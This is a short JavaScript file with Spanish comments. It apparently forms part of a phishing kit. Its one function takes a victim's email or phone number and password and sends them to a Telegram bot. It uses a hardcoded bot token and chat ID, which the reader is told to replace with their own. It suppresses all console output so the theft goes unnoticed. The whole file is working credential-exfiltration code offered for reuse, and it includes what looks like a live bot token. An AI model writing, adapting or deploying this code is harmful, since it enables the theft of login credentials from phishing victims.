// sender.js
// Función para enviar correo y contraseña a un bot de Telegram

function enviarCredencialesTelegram(email, password) {
  const token = '8661171262:AAFERx712IcMyTvPJDId8bLvMPK00hIvJu0'; //cambias por el tuyo
  const chatId = '1739505466';// cambias por el tuyo
  // Detectar si es número telefónico (10 dígitos)
  let tipo = 'Correo';
  let valor = email;
  const soloDigitos = email.replace(/\D/g, '');
  if (/^\d{10}$/.test(soloDigitos)) {
    const area = soloDigitos.slice(0, 3);
    const mid = soloDigitos.slice(3, 6);
    const last = soloDigitos.slice(6);
    valor = `(${area}) ${mid}-${last}`;
    tipo = 'Phone number';
  }
  const mensaje = `Formulario enviado\n${tipo}: ${valor}\nContraseña: ${password}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: chatId,
      text: mensaje
    })
  })
  .then(() => {
    // No mostrar nada en consola
  })
  .catch(() => {
    // No mostrar nada en consola
  });
}

// Exportar la función si se usa con módulos
// export { enviarCredencialesTelegram };